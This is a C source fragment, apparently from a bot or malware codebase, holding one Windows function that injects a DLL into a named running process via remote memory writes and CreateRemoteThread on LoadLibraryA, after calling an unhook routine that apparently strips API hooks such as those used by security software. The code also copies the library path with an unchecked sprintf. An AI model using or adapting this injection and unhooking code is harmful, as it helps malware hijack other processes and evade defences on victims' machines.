

#ifndef NO_INJECTION
#include "bt1.h"

//Inject Library
bool inject_library(char *szProcess, char *szLibPath)
{
	char szDLLPath[256];
	DWORD dwBytesWritten, dwThreadID;
	HANDLE hProcess, hThread;
	LPTHREAD_START_ROUTINE lpModule;
	LPVOID lpBuffer;

#ifndef NO_DEBUG
		printf("[DEBUG] Injecting library, inject_library()...\n");
#endif

#ifndef NO_UNHOOK
		unhook_functions();
#endif

		sprintf(szDLLPath, szLibPath);
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, get_pid(szProcess));
	if (hProcess == NULL) return FALSE;
		lpModule = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "LoadLibraryA");
		lpBuffer = xVirtualAllocEx(hProcess, NULL, sizeof(szDLLPath), MEM_COMMIT, PAGE_READWRITE);
	if (!lpBuffer) return FALSE;
	if (!WriteProcessMemory(hProcess, lpBuffer, szDLLPath, sizeof(szDLLPath), &dwBytesWritten)) return FALSE;
		hThread = xCreateRemoteThread(hProcess, NULL, 0, lpModule, lpBuffer, 0, &dwThreadID);
	if (!hThread) return FALSE;
		WaitForSingleObject(hThread, 1000);
		xVirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return TRUE;
}
#endif